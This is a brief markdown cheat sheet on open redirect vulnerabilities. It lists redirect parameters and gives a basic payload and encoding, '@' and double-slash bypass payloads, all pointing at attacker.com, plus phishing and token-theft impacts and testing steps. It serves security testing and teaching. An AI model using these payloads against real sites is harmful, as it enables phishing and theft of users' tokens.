# 🔁 Open Redirect Cheatsheet

> Testing and exploiting open redirect vulnerabilities

---

## 🎯 Parameters

* `url=`
* `redirect=`
* `next=`

---

## ⚡ Basic Payload

```plaintext
https://target.com/redirect?url=https://attacker.com
```

---

## 🧠 Bypass Techniques

### Encoding

```plaintext
https%3A%2F%2Fattacker.com
```

---

### @ Trick

```plaintext
https://trusted.com@attacker.com
```

---

### Double Slash

```plaintext
//attacker.com
```

---

## 🚨 Impact

* Phishing
* Token theft
* Chaining attacks

---

## 🔍 Testing Steps

1. Find redirect param
2. Replace with attacker URL
3. Check redirect behavior
